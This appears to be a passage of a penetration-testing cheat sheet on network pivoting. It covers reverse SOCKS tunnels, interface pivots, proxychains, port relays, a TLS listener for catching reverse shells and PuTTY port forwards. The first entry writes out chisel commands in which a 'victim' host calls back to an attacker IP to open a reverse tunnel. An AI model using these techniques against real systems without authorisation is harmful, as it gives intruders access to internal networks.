title: Reverse SOCKS proxy
command:
# attacker
chisel server -p 8000 --reverse
# victim
chisel client <attacker-ip>:8000 R:socks
description: Tunnel into internal networks over a SOCKS proxy. Point proxychains at port 1080.
output: A SOCKS5 proxy on the attacker at :1080 reaching the victim's internal network.

title: Interface-based pivot
description: Modern pivoting with a virtual interface, no proxychains, routes feel native.
output: A tun interface you route internal subnets through and reach directly.

title: Route tools through a SOCKS pivot
description: Forces any tool through a proxy chain. Add `socks5 127.0.0.1 1080` to the end of /etc/proxychains4.conf (e.g. a chisel R:socks tunnel), then prefix commands with proxychains4.
output: Your tool's traffic tunneled into the internal network via the SOCKS proxy.

title: Port forward / relay
description: Glues two data streams together for port forwarding, relays and pivots. TCP-LISTEN:...,fork keeps accepting connections. Often already installed on Linux hosts.
output: Local :8080 transparently proxied to the internal host:port.

title: SSL listener for reverse shells
description: Netcat's modern cousin with TLS, for targets that only accept encrypted callbacks. Generate a cert first: openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 10 -nodes. Restrict callers with --allow <ip>.
output: An encrypted listener on :8443 ready to catch a shell or connection.

title: SSH tunneling from Windows
description: PuTTY's CLI SSH client for Windows. Great for reverse (-R) and local (-L) port forwards from a compromised Windows box, e.g. expose its RDP back to you.
output: A forwarded port bridging your host and the target's internal service.
